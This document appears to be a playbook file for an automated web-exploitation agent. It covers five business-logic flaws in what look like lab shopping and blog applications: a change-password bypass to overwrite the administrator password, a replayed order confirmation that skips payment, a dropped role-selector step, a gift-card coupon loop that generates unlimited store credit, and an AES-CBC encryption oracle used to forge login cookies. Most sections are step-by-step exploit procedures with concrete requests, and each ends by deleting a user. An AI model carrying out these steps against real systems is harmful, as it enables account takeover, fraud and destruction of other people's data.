The exec agent must perform a two-phase approach. Phase 1 (probe): register a throwaway account with a 300-char email to measure the exact truncation boundary T from /my-account. Do not skip this — if T differs from 255 the padding_len calculation breaks. Phase 2 (exploit): compute padding_len = T - len('@' + target_domain), construct the crafted email, register, confirm, and log in. The agent must parse the /admin restriction message during discovery to extract the exact target_domain string dynamically rather than hardcoding 'dontwannacry.com'. The confirmation link token arrives in the application email client at the path for the full address — the agent must poll the email client endpoint to retrieve it. The /admin/delete endpoint method (GET vs POST) and exact parameter name ('username' vs 'user') should be read from the admin panel HTML before sending the delete request.

---

## Weak Isolation on Dual-Use Endpoint — Conditional Validation Bypass + Horizontal Privilege Escalation via Username Parameter
**Pattern:** BLF-10: Parameter presence determines security check execution — server gates a required validation on whether the parameter exists in the request body rather than enforcing it unconditionally; combined with attacker-controlled target-user field in the same request body.

### Vulnerability
POST /my-account/change-password is a dual-use endpoint shared by regular users and (implicitly) privileged flows. It has two independent flaws that combine into unauthenticated-to-administrator privilege escalation: (1) The current-password validation is conditional on the parameter being present — if the field is omitted entirely, the server skips the check and processes the password change. (2) The target account is determined by a username parameter in the POST body, not by the authenticated session cookie. Any authenticated user can therefore set username=administrator, omit current-password, and overwrite the administrator password. No current password, no CSRF bypass, and no elevated session are required beyond a normal low-privilege login.

### Signals (detectable from recon)
- POST body contains a username or user_id parameter on a /change-password or /update-password endpoint — target account is caller-supplied rather than session-derived.
- Removing the current-password parameter from the POST body returns HTTP 200 or 302 rather than 400/401/403/422 — validation is conditional on parameter presence.
- Same response code and body for a legitimate password change (current-password=correct) versus a request with current-password entirely absent.
- Endpoint path is /my-account/change-password — a single route serving both self-service and potential admin flows with no privilege bifurcation visible in the URL or request structure.
- Form field names: username, current-password, new-password-1, new-password-2 — the presence of all four in a single POST body is the canonical fingerprint of this dual-use pattern.
- Server does not return an error or extra challenge when username is changed from the authenticated user's own name to a different user (e.g., administrator).

### Discovery Steps (before attacking)
1. Crawl /my-account and any /account, /profile, /user/settings pages for password-change forms. Flag any form whose action contains change-password, update-password, reset-password, or password.
2. For each flagged form, record all POST body parameter names. Flag forms that include a username or user_id field in the POST body (not just in the URL path or session). This is the primary signal: a self-service password-change form that accepts an explicit username parameter is a candidate for horizontal privilege escalation.
3. Enumerate all parameters in the change-password POST body. Identify parameters that appear to be security-critical inputs: fields named current-password, old-password, current_password, password_confirm, or similar. These are candidates for conditional validation bypass testing.
4. Send a probe request with each security-critical parameter omitted one at a time. If the server returns HTTP 200 or a redirect on a request missing current-password (rather than 400, 401, 403, or 422), record this as a confirmed conditional bypass signal.
5. Check whether the server response body or redirect destination differs between (a) legitimate request with correct current-password and (b) request with current-password removed. Identical response = strong confirmation of the bypass.
6. Identify privileged usernames to target: check /admin, /admin/users, or any user-listing endpoint accessible from the low-privilege session. Common targets: administrator, admin, root. If a user-listing endpoint is inaccessible, try username=administrator as a default guess.
7. Identify the admin panel path: after achieving admin login, look for links in the page body containing /admin, /administrator-panel, /manage. The delete-user action endpoint and its required parameter (typically username=<VICTIM_USER>) will be visible in the admin panel HTML.

### Exploit Steps
1. Step 1 — Authenticate as low-privilege user: POST /login with username=<ATTACKER_USER>&password=<ATTACKER_PASS>. Capture the session cookie.
2. Step 2 — Navigate to the account page (GET /my-account) to confirm the password-change form is present and identify the form action URL (/my-account/change-password).
3. Step 3 — Send a baseline password-change request using the authenticated session to observe all POST body parameters. Expected parameters: username=<ATTACKER_USER>, current-password=<ATTACKER_PASS>, new-password-1=<any>, new-password-2=<any>.
4. Step 4 — In Burp Repeater (or the exec agent), clone the request and remove the current-password parameter entirely from the POST body. Keep username=<ATTACKER_USER>, new-password-1=test123, new-password-2=test123. Send the request. If the response is HTTP 200 or a success redirect (302 to /my-account), the conditional validation bypass is confirmed.
5. Step 5 — Now send the privilege-escalation payload: POST /my-account/change-password with the authenticated session cookie, body parameters: username=administrator, new-password-1=Pwned123!, new-password-2=Pwned123!. The current-password parameter must be completely absent from the request body (not present with an empty value — fully removed).
6. Step 6 — Confirm the response is HTTP 200 or success redirect. This indicates the administrator account password has been changed to Pwned123!.
7. Step 7 — Log out of the <ATTACKER_USER> session (GET /logout or equivalent).
8. Step 8 — Log in as administrator: POST /login with username=administrator&password=Pwned123!. Confirm a session cookie is issued.
9. Step 9 — Navigate to the admin panel: GET /admin (or /administrator-panel — check page source/links for the exact path).
10. Step 10 — Delete user <VICTIM_USER>: POST or GET /admin/delete?username=<VICTIM_USER> (exact path and method visible from the admin panel page source). Confirm the response is HTTP 200 or success redirect.
11. Step 11 — Confirm exploitation: verify the target user (e.g., administrator) can be logged into with the new password, or that the privileged action was accepted.

### Key Field Names
- `username`
- `current-password`
- `new-password-1`
- `new-password-2`

### Proof of Exploitation
["Exploitation step 1 proof — conditional bypass: POST /my-account/change-password (authenticated as attacker, current-password omitted) returns HTTP 200 or 302. This proves the server does not enforce current-password as a required field.", "Exploitation step 2 proof — account takeover: POST /my-account/change-password with username=<target_admin_username> and no current-password returns HTTP 200 or 302. Followed immediately by POST /login with the target admin username and the attacker-chosen password, which returns a valid session cookie (HTTP 302 to /my-account or equivalent). A successful login session for the admin account confirms the password was overwritten.", "Final proof — admin action completed: authenticated as administrator, GET /admin returns HTTP 200 with admin panel content. POST or GET /admin/delete?username=<victim_username> returns HTTP 200 or 302. The target user no longer appears in the admin user list."]

### Exec Notes
The exec agent does not need to discover any product IDs or coupon codes for this vulnerability — there are no e-commerce objects involved. The only discovery phase is: (1) confirm the change-password endpoint path by crawling /my-account, (2) confirm the POST body parameter names from the form or a baseline request, (3) confirm the admin panel path after achieving admin login (typically /admin or visible in page source). The credential the attacker test account credentials is known. The target username administrator is a well-known default; no enumeration is needed. The chosen replacement password can be any valid string (e.g., Pwned123!) — it does not need to match any existing credential. The current-password parameter must be fully absent from the POST body on the exploit request, not present with an empty string value — some servers treat empty-string differently from absent-parameter, and only the absent case bypasses the check in this application.

---

## Insufficient Workflow Validation — Order Confirmation Replay (Skip Payment)
**Pattern:** BLF-03

### Vulnerability
The application enforces a multi-step checkout workflow (add-to-cart → POST /cart/checkout → GET /cart/order-confirmation?order-confirmation=true) but does not server-side verify that the payment step actually completed before the confirmation endpoint fulfills an order. The confirmation endpoint is a plain GET with a static boolean query parameter. Any authenticated session that GETs that URL triggers order fulfillment against whatever is currently in the cart, regardless of whether POST /cart/checkout was ever sent in this session. Root cause: the server treats the URL itself as a trusted signal of payment completion instead of recording a session-scoped "payment succeeded" flag after POST /cart/checkout completes successfully.

### Signals (detectable from recon)
- GET /cart/order-confirmation?order-confirmation=true is the redirect target of POST /cart/checkout
- Query parameter name: order-confirmation; value: true (static boolean string — not a per-transaction token)
- POST /cart/checkout issues a 302 redirect to a static URL with no dynamic token in the Location header
- The confirmation GET URL is structurally identical regardless of which items are in the cart
- No CSRF token, HMAC, order nonce, or payment reference in the confirmation GET URL
- Replaying the confirmation GET from a different cart state (different items loaded) returns HTTP 200 with a new order
- GET /my-account after exploit shows store credit unchanged (no deduction) but order history includes the item
- In proxy history: the confirmation GET has no Referer header linking it to a prior checkout POST in the same session — the server does not validate the referrer chain

### Discovery Steps (before attacking)
1. Crawl all endpoints and record every GET that follows a POST 302 redirect. If GET /cart/order-confirmation?order-confirmation=true (or any path containing 'order-confirmation', 'order_confirm', 'confirm', 'order-confirmed', 'complete', 'success', 'finalize') appears as the redirect target of a checkout POST, flag it.
2. Inspect the confirmation URL query parameters. If the parameter is a static boolean string (order-confirmation=true, confirmed=true, success=1, step=complete, done=1) with no per-transaction token, HMAC, nonce, or UUID, the endpoint is a BLF-03 candidate. A static param means all confirmation requests are structurally identical across transactions.
3. Check the redirect target URL for dynamic components. If POST /cart/checkout always redirects to the identical GET URL regardless of cart contents (no order ID embedded in the redirect target), the server has no per-transaction binding in the confirmation step.
4. In auth_diffs: verify GET /cart/order-confirmation?order-confirmation=true returns 200 for an authenticated low-priv user. If it returns 302/401 for anon but 200 for any authenticated user, the only guard is session presence — not payment state.
5. Recon heuristic in candidates.py _action_seed_spec: any POST endpoint whose path contains 'checkout', 'cart', 'order', 'purchase', 'confirm', 'buy' maps to BLF-01/BLF-03. If the same endpoint family also has a paired GET confirmation URL with a boolean param, seed BLF-03 with confidence >= 0.5.
6. Check business_flows from the crawler's flow_mapper. A flow chain of [POST /cart/checkout → GET /cart/order-confirmation] with no intermediate token exchange step is the canonical BLF-03 signal.

### Exploit Steps
1. Step 1 — Authenticate: POST /login with username=<ATTACKER_USER> and password=<ATTACKER_PASS>. Capture and store the session cookie from the Set-Cookie response header.
2. Step 2 — Learn the normal workflow: add any cheap product to cart (POST /cart with productId=<cheap_id> and quantity=1). Send POST /cart/checkout. Observe the 302 redirect. The Location header points to /cart/order-confirmation?order-confirmation=true. Note the exact query parameter name: order-confirmation (not order_confirmed, not confirmed — exact spelling matters for the replay).
3. Step 3 — Capture the confirmation URL: follow the 302 redirect. Send GET /cart/order-confirmation?order-confirmation=true. The server processes the cheap order. Save this exact request (method, URL, query param, session cookie) in Burp Repeater or equivalent. This is the replay payload.
4. Step 4 — Discover the target productId: crawl the product catalog. GET the product listing page (typically /) and extract the productId for 'Lightweight l33t leather jacket'. ProductId is typically a numeric parameter in the product link or in the add-to-cart form (field name: productId). Confirm the item price exceeds available store credit ($100.00).
5. Step 5 — Reset to exploit state: clear the cart if needed (or start a fresh cart), then POST /cart with productId=<jacket_id> and quantity=1. Do NOT proceed to POST /cart/checkout. The cart now contains only the expensive jacket.
6. Step 6 — Execute the exploit: send GET /cart/order-confirmation?order-confirmation=true directly from the session that has the jacket in cart — without first sending POST /cart/checkout. Use the identical request captured in Step 3 (same session cookie, same query param value true).
7. Step 7 — Verify fulfillment: the server returns HTTP 200 with an order confirmation page. The page body contains the jacket name and/or an order ID. GET /my-account to confirm that store credit was NOT deducted (balance remains ~$100.00 or unchanged) while the order is shown as placed.

### Key Field Names
- `order-confirmation (query parameter name, value: true — exact string, case-sensitive)`
- `productId (POST /cart body field — integer, identifies the target item; e.g. productId=1 for the jacket)`
- `quantity (POST /cart body field — integer, e.g. quantity=1)`
- `redir (optional POST /cart body field present in some applications — set to the product path if required by the form; discover from form HTML)`
- `session (session cookie name — must be present in the confirmation GET request; the order is placed against the cart belonging to this session)`

### Proof of Exploitation
HTTP 200 response from GET /cart/order-confirmation?order-confirmation=true whose body contains the order confirmation for the jacket (product name 'Lightweight l33t leather jacket' or an order number). A subsequent GET /my-account shows store credit unchanged (not debited) while the order appears in order history. In the marl3 ProofGate (_eval_state_skip): evidence.state_delta must be non-empty AND at least 2 distinct state-changing endpoints (POST /cart plus GET /cart/order-confirmation) must appear in evidence.exchanges with 2xx status, satisfying both STATE_SKIP and STATE_DELTA markers. Alternatively, LLM extractor sets final_step_confirmed=true or completion_keywords_found=true for the confirmation response if state_delta was not captured numerically.

### Exec Notes
The exec agent must perform two ordered state-changing requests to satisfy the ProofGate requirement of >= 2 distinct action endpoints with 2xx. Step A: POST /cart (adds jacket to cart, endpoint=/cart). Step B: GET /cart/order-confirmation?order-confirmation=true (fulfills order, endpoint=/cart/order-confirmation). Both must be recorded in evidence.exchanges with 2xx status. evidence.state_delta must capture at least one field change — recommended: read account balance before (GET /my-account, extract 'Your store credit: $X') and after (GET /my-account again), record delta as {'store_credit_before': X, 'store_credit_after': Y, 'order_placed': true}. The exec agent must NOT send POST /cart/checkout between Step A and Step B — sending it would follow the legitimate path and would not demonstrate the bypass. The confirmation URL must be sent directly. If the GET /cart/order-confirmation returns a 302 redirect instead of 200, follow the redirect and record the final 200 response as the proof exchange. Label the confirmation exchange as 'order_confirmation_replay' in ex.label for PoC readability.

---

## Authentication Bypass via Flawed State Machine (BLF-12)
**Pattern:** BLF-12

### Vulnerability
The application implements a multi-step post-login flow: authenticate → select role → access app. The session cookie is issued and marked as fully authenticated at POST /login (step 1), before the role-selection step completes. The role-selector step (GET /role-selector) is supposed to assign a role to the session, but the server never enforces that this step was completed before granting access to privileged resources. When the GET /role-selector request is entirely skipped (dropped/never sent), the server-side session has no role assigned and falls back to a default of "administrator" instead of failing closed. The state machine trusts the client to always complete every intermediate step; it does not perform server-side validation of step completion before authorizing access to privileged endpoints. This is a fail-open design flaw: unset role defaults to highest privilege rather than no privilege.

### Signals (detectable from recon)
- POST /login response issues session cookie AND redirects to an intermediate path (not / or /dashboard) — e.g., Location: /role-selector
- Intermediate step is a GET endpoint with a role/account/setup/onboarding name: /role-selector, /choose-role, /select-account, /account-setup, /onboarding
- GET /admin (or other privileged path) from the intermediate step returns 302 (redirect-based block) rather than 403 (hard server deny) — indicates client-dependent enforcement
- Set-Cookie header for the session token appears in the POST /login response, not in a later step response — session is authenticated before the state machine completes
- Content discovery reveals /admin is accessible to authenticated sessions but not linked from the normal unauthenticated flow
- After skipping the intermediate step, the home page renders with higher privileges than expected (e.g., admin panel link visible for a non-admin account)
- Orphan intermediate step: /role-selector has no inbound links from normal authenticated pages — only reachable via the login redirect chain

### Discovery Steps (before attacking)
1. Submit GET / or GET /login and follow the full login flow with actual target credentials from Known-Good Values; record every redirect in the chain after POST /login. If the redirect chain is POST /login → 302 → /role-selector → 302 → / (rather than POST /login → 302 → / directly), a multi-step state machine is present.
2. Inspect the Set-Cookie header in the HTTP response to POST /login. If the session cookie (e.g., session=...) is issued at this step — before /role-selector is visited — the session is authenticated before all steps complete. Confirm the cookie value does not change in subsequent steps.
3. Run content/path discovery (wordlist probe or Burp content discovery) against the authenticated session to enumerate hidden endpoints. Target: identify /admin or equivalent privileged path. Confirm /admin returns 200 or 302-to-admin-content for a fully-roled session.
4. From the /role-selector page (without submitting it), attempt GET /admin directly. If the response is a 302 redirect (to /role-selector or /login) rather than a 403, the enforcement is redirect-based and client-dependent — not a hard server-side deny. This confirms the check is bypassable by skipping the intermediate request.
5. Check whether /role-selector has any inbound links from authenticated pages other than the POST /login redirect. If it is only reachable via the login redirect chain (orphan intermediate step), it is a mandatory-but-unenforced gate — a strong BLF-12 signal.
6. Verify the fallback role: after dropping GET /role-selector and browsing to /, check the rendered page for role/privilege indicators (admin panel link, user label, privilege level shown in HTML). If the page shows administrator-level access, the default-to-high-privilege fail-open behavior is confirmed.

### Exploit Steps
1. Start a proxied browser session. Navigate to the login page and submit POST /login with body: username=<ATTACKER_USER>&password=<ATTACKER_PASS>. Capture the HTTP response; confirm a session cookie is set (e.g., Set-Cookie: session=<token>) and the response is a 302 redirect to /role-selector.
2. Do NOT forward or follow the GET /role-selector request. Drop it entirely. The browser should never send GET /role-selector to the server.
3. With the same authenticated session cookie in place, directly navigate the browser to GET /. The server will process this request using the already-authenticated session that has no role assigned.
4. Observe the home page response. Confirm the page renders with administrator-level access (e.g., an 'Admin panel' link is visible in the navigation or page body).
5. Send GET /admin using the same session cookie. Confirm the response is HTTP 200 and returns the admin interface content (not a redirect to login or role-selector).
6. Identify the delete-user endpoint from the admin panel HTML. The endpoint follows the pattern GET /admin/delete?username=<VICTIM_USER>.
7. Send GET /admin/delete?username=<VICTIM_USER> with the same session cookie. Confirm the response is HTTP 200 or 302 indicating successful deletion.
8. Verify deletion: send GET /admin again and confirm <VICTIM_USER> no longer appears in the user list.

### Key Field Names
- `username (POST /login body parameter, value: <ATTACKER_USER>)`
- `password (POST /login body parameter, value: peter)`
- `session (cookie name, set in Set-Cookie response to POST /login — carry this on all subsequent requests)`
- `username (GET /admin/delete query parameter, value: <VICTIM_USER>)`

### Proof of Exploitation
Exploitation is proven by the following observable state chain: (1) GET / response after dropping GET /role-selector returns HTTP 200 with HTML containing an admin panel link or administrator role indicator for the <ATTACKER_USER> session. (2) GET /admin returns HTTP 200 (not 302 to login or role-selector) with the admin interface HTML listing application users. (3) GET /admin/delete?username=<VICTIM_USER> returns HTTP 200 or 302 followed by a GET /admin response that no longer lists <VICTIM_USER> in the user table. The critical proof artifact is the HTTP response to GET /admin returning 200 with admin content under the <ATTACKER_USER> session, which should only be accessible to an administrator — demonstrating that the skipped role-selector step caused the session to default to the administrator role.

### Exec Notes
The exec agent must implement request-level drop logic: after sending POST /login and receiving the 302 to /role-selector, the agent must NOT follow that redirect. Instead, it must immediately issue GET / (or GET /admin) using the session cookie from the POST /login response, bypassing the /role-selector step entirely. Standard HTTP client libraries that auto-follow redirects will follow the chain and land on /role-selector automatically — the agent must either disable redirect following after POST /login or manually intercept and discard the /role-selector redirect before issuing subsequent requests. The session cookie extracted from the Set-Cookie header of POST /login response must be carried on all subsequent requests. No request body parameters need to be tampered with; the exploit is purely a request omission (dropping one GET) rather than a parameter manipulation.

---

## BLF-05: Infinite Money Logic Flaw — Gift Card Discount Arbitrage Loop
**Pattern:** BLF-05

### Vulnerability
The application permits a promotional discount coupon (e.g., SIGNUP30, 30% off) to be applied to gift card purchases. Gift cards are redeemed at their printed face value regardless of the discounted price paid. Because the coupon code is also reusable across separate checkout sessions (not single-use per account), the full cycle is: buy a $10 gift card for $7 (using SIGNUP30) → redeem for $10 credit → net +$3 per iteration. There is no line-item type check excluding financial instruments (gift cards) from discount eligibility, no coupon reuse limit, and no rate-limiting on sequential identical purchases. This creates an unbounded closed-loop store-credit arbitrage that allows an attacker to accumulate arbitrary store credit and purchase any item at zero effective cost.

### Signals (detectable from recon)
- POST /cart/coupon endpoint exists AND accepts a body parameter named 'coupon' or 'discount_code'
- POST /gift-card (or /redeem or /voucher) endpoint exists — indicates gift card redemption flow
- GET /cart/order-confirmation?order-confirmed=true returns gift card code in plain HTML (grep response for [A-Z0-9]{8,20} near 'Code' label text)
- Applying the coupon to a cart containing only a gift card SKU returns HTTP 200 with no error message (missing error: 'Discount codes cannot be applied to gift card purchases')
- Coupon code accepted on second separate checkout without error (reusability confirmed)
- Store credit increase on /my-account after redemption equals gift card face value, not the discounted purchase price (delta = face_value - discounted_purchase_price > 0)
- No rate-limiting or anomaly response (HTTP 429, CAPTCHA, account lock) on rapid sequential identical purchases

### Discovery Steps (before attacking)
1. Spider/crawl the application and collect all POST endpoints. Flag the presence of ALL FIVE of: POST /cart, POST /cart/coupon (or any endpoint accepting a 'coupon' or 'discount_code' body parameter), POST /cart/checkout, GET /cart/order-confirmation (with a query param like order-confirmed=true), POST /gift-card (or /redeem, /gift_card, /voucher). This five-endpoint fingerprint is the BLF-05 signature.
2. Discover the gift card product ID: GET /shop or GET /products or the storefront catalog page. Parse the HTML for product cards. Look for items whose title/text matches 'gift card' (case-insensitive). Extract the productId value from the form action or the data attribute on the 'Add to cart' button. Typical form field name: 'productId'. Example found value: productId=2 (integer). Also collect redir=CART and quantity=1 as required co-parameters.
3. Discover the coupon/promo code: Register a new account or, if an existing account is available, locate any newsletter signup endpoint (commonly POST /sign-up-newsletter or a form on /my-account with an email field). Submit the signup form. The server response (redirect target or confirmation page) will contain the coupon code string, e.g., SIGNUP30. Alternatively, check the HTML of /my-account or any marketing banner for a visible coupon code. Record the exact string — it is case-sensitive.
4. Verify coupon reusability: In session A, POST /cart/coupon with coupon=SIGNUP30 (after adding any item). In a second fresh session B (different account or after clearing cart), POST /cart/coupon again with the same code. If both return HTTP 200 and a success message (not a '409 coupon already used' or similar error), the coupon is multi-use — the loop precondition is satisfied.
5. Verify gift card exclusion absence: Add only the gift card productId to the cart (POST /cart with productId=<gift_card_id>, quantity=1, redir=CART). Then POST /cart/coupon with coupon=SIGNUP30. If the response is HTTP 200 and the cart total is now 70% of the gift card face value (e.g., $7.00 instead of $10.00), the discount applies to gift cards — the core flaw is confirmed.
6. Verify order-confirmation code exposure: Complete a checkout (POST /cart/checkout). GET /cart/order-confirmation?order-confirmed=true. Grep the response body for a pattern matching [A-Z0-9]{8,20} adjacent to text 'Code', 'Gift card', or inside a <td> element. If a code string is present in plain HTML, it is machine-extractable and the loop is fully automatable without email access.
7. Verify store credit increase equals face value (not purchase price): After redeeming the extracted code via POST /gift-card with gift-card=<extracted_code>, GET /my-account and parse the store credit balance. If balance increased by $10.00 (face value) but checkout cost was $7.00, the delta is +$3.00 — the loop is profitable and confirmed.

### Exploit Steps
1. Authenticate: POST /login with username=<ATTACKER_USER>&password=<ATTACKER_PASS> (or equivalent credentials). Capture the session cookie.
2. Subscribe to newsletter to obtain coupon code: POST /sign-up-newsletter (or equivalent) with the authenticated session. Parse the response or the redirected /my-account page for the coupon code string. Expected value: SIGNUP30. Store as variable COUPON_CODE.
3. Add gift card to cart: POST /cart with body: productId=<gift_card_productId>&quantity=1&redir=CART. Headers: Cookie: <session>. The productId must be discovered from the catalog (see discovery step 2). Verify HTTP 302 or 200 redirect to /cart.
4. Apply discount coupon to cart: POST /cart/coupon with body: csrf=<current_csrf_token>&coupon=SIGNUP30. The CSRF token must be freshly scraped from the current cart page (GET /cart, grep for input[name=csrf] value). Verify the response confirms the discount — cart total should now be $7.00.
5. Checkout: POST /cart/checkout with body: csrf=<current_csrf_token>. Capture the response. If redirected, follow to GET /cart/order-confirmation?order-confirmed=true.
6. Extract gift card code from order confirmation: GET /cart/order-confirmation?order-confirmed=true. Parse response HTML: find the <td> element whose text matches [A-Z0-9]{8,20} (the code appears in a table row labeled 'Code' or similar). Store extracted value as variable GIFT_CARD_CODE.
7. Redeem gift card: POST /gift-card with body: csrf=<current_csrf_token>&gift-card=<GIFT_CARD_CODE>. Verify response HTTP 200 or redirect to /my-account. Store credit should increase by $10.00.
8. Verify net gain: GET /my-account. Parse the store credit balance. Confirm it increased by $10.00 (not $7.00). One loop iteration is now confirmed profitable (+$3.00 net).
9. Automate the loop: Repeat steps 3-7 as a macro/script loop. Each iteration must: (a) freshly scrape the CSRF token from the relevant page before each POST, (b) add a fresh gift card to an empty cart (verify cart is empty before adding), (c) re-apply SIGNUP30 each iteration (coupon clears on checkout), (d) extract a new gift card code from the new order confirmation, (e) redeem the new code. Run sufficient iterations (compute: ceil(target_item_price / net_gain_per_iteration)) to accumulate enough store credit. Use 1 concurrent request (sequential) to avoid cart collision.
10. Final purchase: Once store credit >= price of target item (e.g., 'Lightweight l33t leather jacket' at approximately $1,234.00), add the jacket to cart, apply SIGNUP30 one final time to reduce the checkout price, and POST /cart/checkout. The target application is solved when the purchase completes successfully.

### Key Field Names
- `productId — integer, the gift card SKU; must be discovered from catalog HTML (look for product card with text matching 'gift card')`
- `quantity — always 1 for gift card purchase`
- `redir — set to literal string CART on POST /cart`
- `coupon — exact string SIGNUP30 (or discovered coupon code); sent to POST /cart/coupon`
- `csrf — CSRF token; must be freshly scraped from the current page's HTML (input[name='csrf'] or meta[name='csrf-token']) before every POST request`
- `gift-card — the redeemable code string (format [A-Z0-9]{8,20}); extracted from GET /cart/order-confirmation response HTML, then sent as body parameter to POST /gift-card`
- `order-confirmed — query parameter on GET /cart/order-confirmation; value must be true (without this param the confirmation page may not render the code)`
- `email — used when subscribing to newsletter; use the account's registered email`

### Proof of Exploitation
After N loop iterations (N >= 1 to confirm profitability, N = ceil(target_item_price / net_gain_per_iteration) to reach target credit), GET /my-account and parse the store credit balance field (look for text matching '\\$[0-9,]+\\.[0-9]{2}' in the account page HTML, typically inside a element labeled 'Store credit' or 'Credit balance'). Proof requires: store_credit_balance >= N * net_gain_per_iteration (i.e., each iteration added positive net credit). For full exploitation: store credit balance >= target item price AND a subsequent POST /cart/checkout with the target item in cart returns HTTP 302/200 without an 'insufficient funds' error. The order confirmation page for the item purchase rendering successfully without a payment error is the definitive proof of exploitation.

### Exec Notes
The exec agent must handle CSRF tokens on every POST — do not reuse a stale token across requests. Recommended implementation: before each POST /cart, POST /cart/coupon, POST /cart/checkout, and POST /gift-card, issue a GET to the corresponding form-hosting page (/cart for cart/coupon/checkout tokens, /my-account for gift-card token) and extract the csrf value from the form input. The gift card code extraction regex for the order confirmation page is: search the response body for a table row containing 'Code' followed by a <td> containing [A-Z0-9]{8,20}; alternatively match the pattern between the literal strings '<td>' and '</td>' in the vicinity of 'gift' (case-insensitive) in the HTML. If the code is not found in the confirmation page, check whether the GET request included the session cookie and the order-confirmed=true query parameter — both are required. Run loop iterations sequentially (max_concurrent=1) to avoid cart state collisions where two iterations share a cart session. If the application resets the coupon or clears the cart between sessions, ensure each iteration starts with a verified empty cart (GET /cart, assert no items listed) before POSTing the gift card productId.

---

## Authentication Bypass via Encryption Oracle
**Pattern:** BLF-OTHER

### Vulnerability
The application exposes both an encryption oracle and a decryption oracle through two distinct cookies that share the same symmetric AES-128-CBC key. The encrypt oracle is on POST /post/comment: when an invalid email is submitted, the server prepends the literal string "Invalid email address: " (23 bytes) to the user-supplied email value, encrypts the concatenation with the shared key, and returns the ciphertext as Set-Cookie: notification=&lt;base64url&gt;. The decrypt oracle is on GET /post?postId=x: the notification cookie value is decrypted server-side and its plaintext is rendered verbatim in the response body as an error message. The stay-logged-in cookie (format: username:timestamp) is encrypted with the same key but has no HMAC or purpose-binding field. Because AES-128-CBC block boundaries are independent, an attacker can: (1) decrypt the stay-logged-in cookie via the notification oracle to learn the timestamp format, (2) encrypt "xxxxxxxxxadministrator:TIMESTAMP" via the email oracle (the 9 x chars pad the 23-byte prefix to exactly 32 bytes = 2 blocks), (3) strip the first 32 bytes of the resulting ciphertext (the two blocks encrypting "Invalid email address: xxxxxxxxx"), (4) use the remaining ciphertext as the stay-logged-in cookie to authenticate as administrator with no password required.

### Signals (detectable from recon)
- Set-Cookie: notification= header appears on POST /post/comment error responses (especially 302 redirects), not just on login
- The notification cookie value is Base64-encoded binary with length that is a multiple of 16 — same encoding class as stay-logged-in
- Error message on GET /post?postId=x renders the exact decrypted plaintext of the notification cookie verbatim in the HTML body
- Error message format is 'Invalid email address: <user_input>' — server is encrypting user-controlled data, confirming encrypt oracle
- stay-logged-in cookie and notification cookie have the same Base64 character set, similar byte-length, and are both multiples of 16 bytes when decoded — shared-key indicator
- No HMAC suffix, no signature field, no purpose tag appended to either cookie ciphertext — no integrity binding
- Swapping stay-logged-in value into notification cookie slot causes the decrypted username:timestamp to appear in the page response — cross-context oracle proof

### Discovery Steps (before attacking)
1. After login with stay-logged-in checked, record the stay-logged-in cookie value. Base64-decode it — if the decoded length is a multiple of 16 and is binary (not a JWT/UUID), suspect AES block cipher.
2. Submit a comment with an obviously invalid email (e.g., the single character 'x'). Inspect the 302 response for a Set-Cookie: notification= header. If present, Base64-decode the notification cookie value — if it is binary and length is a multiple of 16, this is ciphertext.
3. Follow the redirect to GET /post?postId=x. If the response body contains the literal string 'Invalid email address: x', the notification cookie was just decrypted and its plaintext rendered — decryption oracle confirmed.
4. Swap: copy the stay-logged-in cookie value, paste it as the notification cookie on GET /post?postId=x. If the response renders a string like '<ATTACKER_USER>:1598530205184', the two cookies share the same key — cross-context oracle confirmed.
5. Confirm CBC block stripping is feasible: Base64-decode the notification ciphertext after encrypting a 9-char-padded payload. Verify total byte length >= 48. Remove bytes 0-31 (first 32 bytes), re-encode — if the decrypt oracle returns 'administrator:TIMESTAMP' without prefix, CBC block stripping works.

### Exploit Steps
1. Step 1 — Login: POST /login with body username=<ATTACKER_USER>&password=<ATTACKER_PASS>&stay-logged-in=1. Record the stay-logged-in cookie value from the response (call it SLI_CT).
2. Step 2 — Decode stay-logged-in format: Send GET /post?postId=1 with Cookie: notification=<SLI_CT> (URL-encode SLI_CT if needed). Read the decrypted plaintext from the response body. It will be in the form '<ATTACKER_USER>:1598530205184'. Extract the numeric timestamp (call it TS).
3. Step 3 — Build padded plaintext: Construct the email parameter value as exactly 'xxxxxxxxxadministrator:TS' (9 lowercase x characters followed immediately by 'administrator:' followed by TS). This makes the prefix 'Invalid email address: xxxxxxxxx' exactly 32 bytes (2 AES blocks), so the target string 'administrator:TS' starts at byte offset 32.
4. Step 4 — Encrypt oracle: Send POST /post/comment with Cookie: session=<your_session> and body including email=xxxxxxxxxadministrator:TS (all other required comment fields can be arbitrary valid values). Capture the Set-Cookie: notification=<NOTIF_CT> value from the 302 response.
5. Step 5 — Strip prefix blocks: URL-decode NOTIF_CT, then Base64-decode it to raw bytes. Delete bytes 0 through 31 inclusive (the first 32 bytes = 2 cipher blocks). Base64-encode the remaining bytes, then URL-encode the result (call it FORGED_CT).
6. Step 6 — Verify (optional but recommended): Send GET /post?postId=1 with Cookie: notification=<FORGED_CT>. The response should contain exactly 'administrator:TS' with no 'Invalid email address:' prefix. If there is a garbled first block, you may need to adjust padding; if the output is clean, proceed.
7. Step 7 — Auth bypass: Send GET / with Cookie: stay-logged-in=<FORGED_CT> and NO session cookie present. The application should respond as if logged in as administrator (check for admin-specific UI elements or an admin link in the response).
8. Step 8 — Access admin panel: Send GET /admin with Cookie: stay-logged-in=<FORGED_CT>. Expect HTTP 200 with the admin interface.
9. Step 9 — Delete target user: Send GET /admin/delete?username=<VICTIM_USER> with Cookie: stay-logged-in=<FORGED_CT>. A 302 redirect to /admin confirms the deletion. Exploitation is confirmed.

### Key Field Names
- `stay-logged-in (cookie) — the authentication token to forge; format after decryption is 'username:unixtimestamp_ms'`
- `notification (cookie) — the oracle vehicle; its value is the server-encrypted form of 'Invalid email address: ' + email_param`
- `email (POST body parameter on /post/comment) — the injection point for the encrypt oracle; controlled plaintext prepended with 23-byte fixed prefix`
- `session (cookie) — the legitimate session cookie; must be ABSENT in the final exploit request to prove bypass via stay-logged-in alone`
- `username (query parameter on /admin/delete) — set to '<VICTIM_USER>' for the final solve action`
- `postId (query parameter on /post) — any valid integer (e.g., 1); required to trigger the decryption oracle render`

### Proof of Exploitation
GET /admin/delete?username=<VICTIM_USER> returns HTTP 302 redirect (Location: /admin) while authenticated solely via the forged stay-logged-in cookie with no session cookie present. Additionally, GET /admin with only the forged stay-logged-in cookie must return HTTP 200 (not 401/403/redirect-to-login) and the response body must contain the admin panel HTML including the 'Delete user' controls. The absence of a session cookie in the winning request is the key differentiator proving the bypass was achieved through the forged ciphertext rather than a legitimate session.

### Exec Notes
